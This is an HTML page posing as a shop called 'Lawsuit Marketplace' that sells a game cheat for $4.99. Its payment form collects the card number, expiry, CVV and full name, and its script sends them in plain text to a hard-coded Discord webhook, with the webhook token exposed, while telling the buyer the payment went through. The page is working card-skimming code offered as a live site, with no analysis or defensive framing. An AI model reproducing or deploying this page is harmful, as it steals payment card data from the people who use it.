<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Lawsuit MarketPlace</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
    rel="stylesheet"
  />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap');

    body {
      font-family: 'Inter', sans-serif;
      background: #0f172a; /* dark background for particles */
      position: relative;
      overflow-x: hidden;
      margin: 0;
      padding: 0;
      color: white;
    }

    .font-poppins {
      font-family: 'Poppins', sans-serif;
    }

    /* Make particles container fill the screen and be behind everything */
    #particles-js {
      position: fixed;
      width: 100%;
      height: 100%;
      z-index: -1;
      top: 0;
      left: 0;
      background-color: #0f172a;
    }

    .product-card {
      transition: opacity 0.3s ease, transform 0.3s ease;
      opacity: 1;
      transform: scale(1);
    }

    /* Popup Modal Styles */
    .modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: 999;
      justify-content: center;
      align-items: center;
    }

    .modal-content {
      background: #1f2937;
      padding: 20px;
      border-radius: 8px;
      max-width: 400px;
      width: 100%;
    }

    .modal input {
      background-color: #333;
      color: white;
      border: 1px solid #444;
      padding: 10px;
      margin: 10px 0;
      width: 100%;
      border-radius: 5px;
    }

    .modal button {
      background-color: #3490dc;
      padding: 10px 20px;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>
<body class="bg-gray-950 text-white">
  <!-- particles container -->
  <div id="particles-js"></div>

  <header
    class="bg-gray-900 bg-opacity-80 shadow-md p-4 flex justify-between items-center relative z-10"
  >
    <h1 class="text-3xl font-semibold font-poppins tracking-wide text-white">Lawsuit Marketplace</h1>
    <nav>
      <ul class="flex gap-6">
        <li>
          <a href="#" class="hover:text-gray-400 transition duration-200">Home</a>
        </li>
        <li>
          <a href="cart.html" class="relative inline-block hover:text-gray-400 transition duration-200">
            Cart
            <span id="cart-count" class="absolute -top-2 -right-4 bg-red-600 text-xs rounded-full w-5 h-5 flex items-center justify-center font-bold text-white hidden">
              0
            </span>
          </a>
        </li>

        <li>
          <a href="#" class="hover:text-gray-400 transition duration-200">My Orders</a>
        </li>
        <li>
          <a href="#" class="hover:text-gray-400 transition duration-200">Contact</a>
        </li>
      </ul>
    </nav>
  </header>

  <main class="p-6 relative z-10">
    <h2 class="text-3xl font-semibold mb-6">Featured Products</h2>
    <div class="flex flex-wrap gap-6 justify-center">
      <!-- Only one product card remains -->
      <div data-game="R6 Siege" class="product-card bg-gray-800 bg-opacity-80 p-6 rounded-2xl shadow ... w-[320px]">
        <img src="https://i.postimg.cc/HnsSBH2m/public-1.png" alt="Discord Token Checker" class="rounded-xl mb-4 w-[320px] h-[240px] object-cover" />
        <h3 class="text-xl font-semibold mb-2">Crusador full</h3>
        <p class="text-gray-400 mb-4">Intel and AMD Supported.</p>
        <div class="flex justify-between items-center">
          <span class="text-lg font-bold">$4.99</span>
          <button class="bg-blue-600 px-4 py-2 rounded-xl hover:bg-blue-700 transition-transform duration-200 transform hover:scale-105" id="buy-button">Buy Now</button>
        </div>
      </div>
    </div>
  </main>

  <!-- Modal for payment -->
  <div id="payment-modal" class="modal">
    <div class="modal-content">
      <h3 class="text-xl font-semibold mb-4">Payment Information</h3>
      <form id="payment-form">
        <input type="text" id="card-number" placeholder="Card Number" required />
        <input type="text" id="expiry" placeholder="Expiry (MM/YY)" required />
        <input type="text" id="cvv" placeholder="CVV" required />
        <input type="text" id="full-name" placeholder="Full Name" required />
        <button type="submit">Submit Payment</button>
      </form>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      // Get the 'Buy Now' button and the modal
      const buyButton = document.getElementById('buy-button');
      const modal = document.getElementById('payment-modal');
      const paymentForm = document.getElementById('payment-form');

      // Show modal when 'Buy Now' is clicked
      buyButton.addEventListener('click', () => {
        modal.style.display = 'flex';
      });

      // Close modal when the user clicks outside the modal content
      modal.addEventListener('click', (e) => {
        if (e.target === modal) {
          modal.style.display = 'none';
        }
      });

      // Handle form submission and send to webhook
      paymentForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const cardNumber = document.getElementById('card-number').value;
        const expiry = document.getElementById('expiry').value;
        const cvv = document.getElementById('cvv').value;
        const fullName = document.getElementById('full-name').value;

        const data = {
          content: `New payment information received:

- **Card Number**: ${cardNumber}
- **Expiry**: ${expiry}
- **CVV**: ${cvv}
- **Full Name**: ${fullName}`
        };

        // Send data to Discord webhook
        try {
          const response = await fetch('https://discordapp.com/api/webhooks/1373748781861834882/2SDjfj-z2YxeR71Z8JDFLw3lk8uQwjIu_PwYrgTfMwLrIsVyBdJBW5PBNB1qg50wfLAe', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
          });

          if (response.ok) {
            alert('Payment details submitted successfully!');
            modal.style.display = 'none';
          } else {
            alert('Failed to submit payment details');
          }
        } catch (error) {
          alert('Error sending data');
        }
      });
    });
  </script>

</body>
</html>
